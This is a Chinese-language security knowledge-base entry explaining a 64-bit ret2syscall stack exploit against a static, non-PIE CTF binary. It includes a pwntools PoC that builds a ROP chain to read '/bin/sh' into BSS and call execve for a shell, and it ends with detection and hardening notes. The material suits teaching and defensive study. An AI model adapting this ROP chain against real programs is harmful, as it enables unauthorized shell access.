---
id: binary-pwn-stack-ret2syscall-64bit-bss-binsh-execve
title: 64 位 ret2syscall：静态链接无 /bin/sh 时先 read 写入 BSS 再 execve
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2syscall-64bit-bss-read-execve
tags:
- pwn
- stack
- rop
- ret2syscall
- syscall
- execve
- static-link
- x86-64
- nx
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V181
  verified_at: '2026-11-06T17:43:19+08:00'
  notes: 已对照原文核对：ret2sys_64 的 pop rax/rdi/rdx_rsi/syscall 地址、0x50+8 偏移、read(0,bss,0x10)+execve(bss,0,0) 链与原文 exp 逐项一致。未复跑，gadget/BSS 地址为该示例二进制专用。
url: /docs/binary/pwn/stack/binary-pwn-stack-ret2syscall-64bit-bss-binsh-execve/
draft: false
kb_aliases:
- 64 位 ret2syscall
- x86_64 syscall ROP
- execve BSS /bin/sh
- 静态链接 ROP
- ret2sys_64
- pop rax rdi rdx rsi syscall
---

## 一句话结论

64 位静态链接程序开启 NX、没有 libc/system 也没有 `/bin/sh` 字符串时，可用 `pop rax/rdi/rdx/rsi` + `syscall` gadget 构造 ROP：先 `read(0, bss, 0x10)` 把用户输入的 `/bin/sh\0` 写到可写 BSS，再 `execve(bss, 0, 0)`（rax=59、rdi=bss、rsi=0、rdx=0）直接拿 shell，完全不依赖 libc。

## 原理

- **x86_64 syscall ABI**：系统调用号放 `rax`，参数依次放 `rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`，执行 `syscall` 指令进入内核；返回值在 `rax`。
- **execve**：syscall 号 59，`execve(filename, argv, envp)`；`argv`/`envp` 可为 NULL（Linux 接受），因此只需 `rax=59, rdi=filename, rsi=0, rdx=0`。
- **没有 /bin/sh 字符串**：静态链接二进制中可能搜不到 `/bin/sh`；但程序有 `read` 系统调用/gadget，可先执行 `read(0, bss, 0x10)`（rax=0、rdi=0、rsi=bss、rdx=0x10），把攻击者发送的 `/bin/sh\0` 写入 `.bss` 可写段；随后把 `rdi` 设为该 BSS 地址执行 execve。
- **gadget 需求**：`pop rax; ret`、`pop rdi; ret`、`pop rdx; pop rsi; ret`（或分别的 pop rsi/pop rdx）、`syscall`。静态链接二进制通常自带这些片段；若无，可用 ret2csu 设置 rdi/rsi/rdx。
- **栈布局**：填充到返回地址（示例 `0x50+8`），依次布置 read 链与 execve 链；`read` 返回后执行下一段 ROP，`execve` 成功后进程映像被 `/bin/sh` 替换。
- **为什么可行**：NX 只禁止执行数据页，ROP 复用 `.text` 中的指令；系统调用不经过 libc，因此静态链接/无 libc 符号不影响利用；BSS 可写且地址固定（无 PIE）。

## 触发条件

- 64 位 ELF，NX 开启，未开启 PIE（或已泄露代码基址），静态链接/无 libc 可用。
- 存在栈溢出可覆盖返回地址，且能控制足够长的 ROP 链。
- 二进制中存在 `pop rax; ret`、`pop rdi; ret`、`pop rdx; pop rsi; ret`、`syscall` 等 gadget（或用 ret2csu 替代）。
- `.bss` 可写且地址已知；程序可执行 `read`/`syscall`。
- 目标内核允许 `execve("/bin/sh", NULL, NULL)`（常规 Linux 均可）。

## 利用步骤

1. `checksec`/`file` 确认 64 位、NX、No PIE、静态链接；计算溢出偏移。
2. 用 ROPgadget 找 `pop rax; ret`、`pop rdi; ret`、`pop rdx; pop rsi; ret`、`syscall`，并用 `readelf -S` 找可写 `.bss` 地址。
3. 构造第一段 ROP：`pop rax; 0`、`pop rdi; 0`、`pop rdx; pop rsi; 0x10; bss`、`syscall`，即 `read(0, bss, 0x10)`。
4. 构造第二段 ROP：`pop rax; 0x3b`、`pop rdx; pop rsi; 0; 0`、`pop rdi; bss`、`syscall`，即 `execve(bss, 0, 0)`。
5. 发送 payload 后再发送 `/bin/sh\0`；程序先读入 BSS，再 execve 执行 shell。
6. 若 gadget 不全，改用 ret2csu 设置 rdi/rsi/rdx，或用 `read` 链 + `mprotect` 执行 shellcode。

## PoC

```python
from pwn import *
elf = ELF('./ret2sys_64')

pop_rax      = 0x46b9f8
pop_rdi      = 0x4016c3
pop_rdx_rsi  = 0x4377f9
syscall_addr = 0x45bac5
bss_addr     = 0x6c1c40

payload  = b'a' * (0x50 + 0x8)
# read(0, bss, 0x10)
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdx_rsi) + p64(0x10) + p64(bss_addr)
payload += p64(pop_rdi) + p64(0)
payload += p64(syscall_addr)
# execve(bss, 0, 0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdx_rsi) + p64(0) + p64(0)
payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(syscall_addr)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

原文在 64 位静态二进制上验证拿 shell；地址为题目二进制固定地址，PoC 未在本机复跑。

## 变体与关联

- 32 位变体：`eax=11、ebx=/bin/sh、ecx=edx=0、int 0x80`，见 [[binary-pwn-stack-ret2syscall-32bit]]。
- ORW 变体：若目标被 seccomp 限制只能 open/read/write，把 execve 换成 `open/read/write` 链；见 [[binary-pwn-stack-fake-rbp-check-seccomp-orw]]。
- gadget 缺失变体：用 ret2csu 设置 rdi/rsi/rdx，见 [[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]。
- 关联：[[binary-pwn-stack-ret2plt-system-sh-local-root-service]]（动态链接 ret2plt）、[[binary-pwn-rop-static-link-ret2system-sh]]（静态链接找 system）。
- 边界：Full RELRO 不影响 syscall；PIE 需要先泄露基址；gadget 不全、seccomp 禁止 execve、BSS 不可写时需换方案。

## 检测与防御

- 检测：ROP 链中出现 `pop rax; 59`、`syscall`、`/bin/sh` 写入 BSS；进程异常 execve 自身 shell。
- 防御：开启 PIE/ASLR、Full RELRO、CET/IBT；seccomp 限制 execve；编译时减少不必要的 syscall gadget；栈保护/CFI。
- 加固：静态链接程序同样需要 NX/RELRO/PIE；对输入长度做严格检查；运行时监控异常 syscall。
